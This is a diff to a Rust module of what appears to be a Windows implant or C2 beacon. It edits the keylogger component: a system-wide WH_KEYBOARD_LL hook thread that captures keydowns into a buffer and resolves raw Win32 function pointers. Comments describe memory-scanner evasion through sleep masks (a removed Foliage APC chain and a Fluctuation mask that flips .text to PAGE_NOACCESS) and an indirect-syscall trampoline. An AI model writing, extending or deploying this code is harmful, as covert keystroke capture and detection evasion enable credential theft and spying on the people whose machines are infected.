@@ -311,10 +311,12 @@ fn get_key_state_fn() -> Option<unsafe extern "system" fn(i32) -> i16> {
 // it seals the claim head, waits for every in-flight writer to publish its
 // byte, copies, and reopens — see the dump discipline in the module docs.
 //
-// Foliage interaction: while the hook thread is live, `sleep.rs`'s Foliage
-// mask path checks [`hook_is_active`] and degrades to the data-only floor —
-// encrypting `.text` while the hook callback (which lives in `.text`) is in
-// flight would corrupt it. See `sleep.rs::execute_foliage_plan` for the gate.
+// Sleep-mask interaction (historical): the old Foliage APC mask path checked
+// [`hook_is_active`] and degraded so it never encrypted `.text` while the hook
+// callback (which lives in `.text`) was in flight. That gate was removed with
+// the Foliage chain (commit 841ffc5). The shipped Fluctuation mask flips
+// `.text` to PAGE_NOACCESS and has NO keylog gate today — `hook_is_active`
+// now only arbitrates BUF ownership between the polling and hook paths.
 
 /// `WH_KEYBOARD_LL` hook id (low-level keyboard, system-wide, no DLL needed).
 const WH_KEYBOARD_LL: i32 = 13;
@@ -339,7 +341,7 @@ struct KbdllHookStruct {
 
 /// Bundle of raw user32/kernel32 fn pointers resolved ONCE on the beacon
 /// thread, then copied into the hook thread's param block. Mirrors the
-/// `FoliageRaw` pattern (`sleep.rs:514-639`). All pointers bypass the shared
+/// `FoliageRaw` pattern (`sleep.rs`). All pointers bypass the shared
 /// indirect-syscall trampoline.
 #[repr(C)]
 #[derive(Clone, Copy)]
@@ -403,8 +405,9 @@ struct Msg {
     pt: u64, // POINT packed into 8 bytes (we don't read it).
 }
 
-/// Param block leaked into the hook thread via `Box::into_raw`. Mirrors
-/// `FoliageParams` (`sleep.rs:483-505`). The thread reads `raw` to call any
+/// Param block leaked into the hook thread via `Box::into_raw`. Mirrors the
+/// raw-param-block pattern used for the (since removed) Foliage helper
+/// thread. The thread reads `raw` to call any
 /// Win32 fn, and the beacon reads `tid`/`exit` to control it.
 #[repr(C)]
 struct KeylogThreadParams {
@@ -424,8 +427,8 @@ struct KeylogThreadParams {
 
 // ---- Hook-thread lifetime state (beacon-thread side) ----
 
-/// Non-zero while the hook thread is live. Polled by [`hook_is_active`] which
-/// `sleep.rs` reads to gate the Foliage mask path.
+/// Non-zero while the hook thread is live. Polled by [`hook_is_active`] to
+/// arbitrate BUF ownership between the polling path and the hook thread.
 static HOOK_THREAD_LIVE: core::sync::atomic::AtomicBool =
     core::sync::atomic::AtomicBool::new(false);
 /// Leaked param block pointer (zero when no hook thread is running). Owned by
@@ -436,9 +439,9 @@ static mut HOOK_PARAMS: *mut KeylogThreadParams = core::ptr::null_mut();
 static HOOK_THREAD_HANDLE: core::sync::atomic::AtomicUsize =
     core::sync::atomic::AtomicUsize::new(0);
 
-/// `true` while the hook thread is live and capturing. `sleep.rs` reads this
-/// to gate the Foliage `.text`-encryption path (encrypting `.text` while the
-/// hook callback is in flight corrupts it).
+/// `true` while the hook thread is live and capturing. Used inside this
+/// module to arbitrate BUF ownership (the historical Foliage sleep-mask gate
+/// that also read this was removed with the Foliage chain, commit 841ffc5).
 pub(crate) fn hook_is_active() -> bool {
     HOOK_THREAD_LIVE.load(core::sync::atomic::Ordering::Acquire)
 }
@@ -608,10 +611,11 @@ unsafe fn keylog_hook_thread_unhook(params: *mut KeylogThreadParams, unhook_addr
 /// pump's call stack). On `WM_KEYDOWN`/`WM_SYSKEYDOWN`, reads the
 /// `KBDLLHOOKSTRUCT` from `lParam`, translates the vk, and pushes into `BUF`.
 ///
-/// CRITICAL: this fn lives in `.text`. The Foliage sleep-mask path checks
-/// [`hook_is_active`] and degrades when this thread is live — if it ever runs
-/// during a `.text`-encrypt window it would execute ciphertext. The gate in
-/// `sleep.rs` is the guard.
+/// CRITICAL: this fn lives in `.text`. The old Foliage sleep-mask path checked
+/// [`hook_is_active`] and degraded when this thread was live — running during
+/// a `.text`-encrypt window would execute ciphertext. That gate was removed
+/// with the Foliage chain (commit 841ffc5); the shipped Fluctuation mask
+/// flips `.text` to PAGE_NOACCESS and does not re-check this flag today.
 unsafe extern "system" fn keylog_hook_proc(n_code: i32, w_param: usize, l_param: isize) -> isize {
     // We only act on HC_ACTION + a keydown message.
     if n_code != HC_ACTION {
